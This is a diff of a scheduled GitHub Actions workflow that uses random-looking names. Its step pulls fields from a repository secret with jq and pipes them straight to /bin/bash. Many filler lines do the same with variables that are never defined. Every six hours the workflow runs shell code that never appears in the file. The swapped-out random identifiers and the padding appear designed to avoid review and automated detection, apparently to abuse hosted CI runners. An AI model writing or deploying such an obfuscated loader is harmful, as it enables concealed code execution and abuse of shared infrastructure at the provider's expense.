@@ -1,32 +1,26 @@
 name: miaoqingji1981
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 0/6 * * *'
+    - cron: '1 1/6 * * *'
 
-jobs:  # 19531
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: miaoqingji1981
         env:
-          e618: ${{ secrets.e618 }}
+          bap31: ${{ secrets.bap31 }}
         run: |
-          echo $e618 | jq -r .bxh18 | /bin/bash
-          echo $uv19075 | jq -r .mmnru50599 | /bin/bash
-          echo $lqe57650 | jq -r .h8 | /bin/bash
-          echo $x245 | jq -r .nzeli7835 | /bin/bash
-          echo $g9 | jq -r .knpbk5 | /bin/bash
-          echo $ddy17371 | jq -r .fag12 | /bin/bash
-          echo $vkkxj9 | jq -r .eqbqs702 | /bin/bash
-          echo $nff3 | jq -r .lfwp130 | /bin/bash
-          echo $w836 | jq -r .u8293 | /bin/bash
-          echo $ss653 | jq -r .w609 | /bin/bash
-          echo $hw90 | jq -r .qvjo7 | /bin/bash
-          echo $uhdbt0 | jq -r .qtkwq758 | /bin/bash
-          echo $nauas8080 | jq -r .zupp4454 | /bin/bash
-          echo $rn8 | jq -r .k4 | /bin/bash
-          echo $pmfl6 | jq -r .ssy2 | /bin/bash
+          echo $bap31 | jq -r .f3 | /bin/bash
+          echo $m3 | jq -r .sg340 | /bin/bash
+          echo $cpp5 | jq -r .vfz6 | /bin/bash
+          echo $nifs071 | jq -r .lx30 | /bin/bash
+          echo $yeqrw73963 | jq -r .uc052 | /bin/bash
+          echo $ubh22662 | jq -r .hsdfi37235 | /bin/bash
+          echo $m43858 | jq -r .cvi28099 | /bin/bash
+          echo $gqb9502 | jq -r .omzwy751 | /bin/bash
+          echo $jgn973 | jq -r .lgvgg30238 | /bin/bash
 
